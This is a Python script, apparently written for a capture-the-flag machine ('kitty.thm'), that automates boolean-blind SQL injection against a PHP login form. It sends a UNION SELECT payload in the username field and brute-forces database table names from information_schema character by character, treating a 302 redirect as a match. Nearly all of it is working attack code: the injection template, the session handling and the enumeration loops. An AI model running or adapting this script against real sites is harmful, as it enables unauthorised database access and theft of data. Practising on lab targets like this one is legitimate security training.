#!/usr/bin/env python3
# enum_tables.py
# Enumerate table names in a given database using blind "LIKE 'prefix%'" probes.
# Assumes: POST /index.php with username payload triggers 302 on match, 200 otherwise.
# Sleeps 0.3s between requests and performs GET /logout.php after each probe.
#
# Edit CONFIG section (TARGET_URL, COOKIE_VALUE) before running.

import requests
import time
import sys
from urllib.parse import urljoin
from requests.exceptions import RequestException

# ================= CONFIG =================
TARGET_URL = "http://kitty.thm/index.php"   # POST endpoint (full URL)
COOKIE_VALUE = "t4ic0s1fnma6j8pjobipfbucgf" # fixed PHPSESSID
DATABASE_NAME = "mywebsite"                 # target DB to enumerate
PASSWORD = "aaa"                            # form password
LOGOUT_PATH = "/logout.php"                 # logout GET path (same host)
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-$ABCDEFGHIJKLMNOPQRSTUVWXYZ"
SLEEP_BETWEEN = 0.3     # seconds between requests (as requested)
MAX_NAME_LEN = 64       # safety cap for table name length
MAX_TABLES = 200        # max number of tables to attempt
ALLOW_REDIRECTS_FOR_LOGOUT = True
# ==========================================

HEADERS = {
    "User-Agent": "Mozilla/5.0 (enum-tables-script)",
    "Content-Type": "application/x-www-form-urlencoded",
}

# payload template: adjust SELECT columns count to match app if needed
USERNAME_TEMPLATE = (
    "a' UNION SELECT 1,2,3,4 WHERE "
    "(SELECT table_name FROM information_schema.tables "
    "WHERE table_schema='{db}' LIMIT {idx},1) LIKE '{pattern}';-- -"
)

session = requests.Session()
session.headers.update(HEADERS)
session.cookies.set("PHPSESSID", COOKIE_VALUE)

def get_logout_url(target, logout_path):
    return urljoin(target, logout_path)

LOGOUT_URL = get_logout_url(TARGET_URL, LOGOUT_PATH)

def reset_session_cookie():
    # re-inject the fixed PHPSESSID after logout (helps in CTF setups)
    session.cookies.set("PHPSESSID", COOKIE_VALUE)

def send_probe_for_pattern(db, table_index, pattern):
    """
    Send single POST probing whether the table_name at LIMIT table_index matches 'pattern'
    pattern should include trailing % when desired (e.g. 'adm%')
    Returns True if response indicates a match (302), False otherwise.
    Always attempts logout GET afterwards and re-injects PHPSESSID.
    """
    payload_username = USERNAME_TEMPLATE.format(db=db, idx=table_index, pattern=pattern)
    data = {
        "username": payload_username,
        "password": PASSWORD
    }
    tries = 3
    for attempt in range(tries):
        try:
            resp = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=10)
            is_match = (resp.status_code == 302)
            # optional stricter match (uncomment if you want Location check):
            # is_match = (resp.status_code == 302 and 'welcome.php' in resp.headers.get('Location',''))

            # after probe, attempt logout (best-effort)
            try:
                session.get(LOGOUT_URL, allow_redirects=ALLOW_REDIRECTS_FOR_LOGOUT, timeout=8)
            except RequestException as e:
                # ignore logout failures but print debug
                print(f"[!] Logout GET failed (ignored): {e}", file=sys.stderr)

            # reinstate fixed PHPSESSID to ensure next probe starts with same cookie
            reset_session_cookie()

            return is_match
        except RequestException as e:
            print(f"[!] Network error on attempt {attempt+1}: {e}", file=sys.stderr)
            time.sleep(1)
    raise RuntimeError("Network failure: all retries failed")

def enumerate_single_table_name(db, table_index):
    """
    Enumerate one table name (LIMIT table_index,1).
    Returns the table name string, or None if no table exists at that index (i.e. first char no match).
    """
    name = ""
    for pos in range(1, MAX_NAME_LEN + 1):
        found = False
        for ch in CHARSET:
            pattern = f"{name + ch}%"
            try:
                match = send_probe_for_pattern(db, table_index, pattern)
            except RuntimeError:
                print("[!] Network problems, aborting enumeration.", file=sys.stderr)
                return None
            if match:
                name += ch
                print(f"[+] table[{table_index}] char #{pos}: '{ch}' -> so far: '{name}'")
                found = True
                time.sleep(SLEEP_BETWEEN)
                break
            else:
                time.sleep(SLEEP_BETWEEN)
        if not found:
            # if at first position we found nothing, probably this table index doesn't exist
            if pos == 1:
                return None
            # otherwise we've reached the end of the name
            break
    return name

def enumerate_all_tables(db):
    tables = []
    print(f"[*] Starting table enumeration for DB '{db}'")
    print(f"[*] Target POST: {TARGET_URL}")
    print(f"[*] Logout URL: {LOGOUT_URL}")
    for idx in range(0, MAX_TABLES):
        print(f"[*] Enumerating table at index {idx} ...")
        tbl = enumerate_single_table_name(db, idx)
        if tbl is None:
            print(f"[*] No table found at index {idx}. Assuming enumeration finished.")
            break
        print(f"[+] Found table #{len(tables)} at index {idx}: {tbl}")
        tables.append(tbl)
    print("[*] Enumeration complete. Tables found:")
    for i, t in enumerate(tables):
        print(f"  {i}: {t}")
    return tables

if __name__ == "__main__":
    try:
        enumerate_all_tables(DATABASE_NAME)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
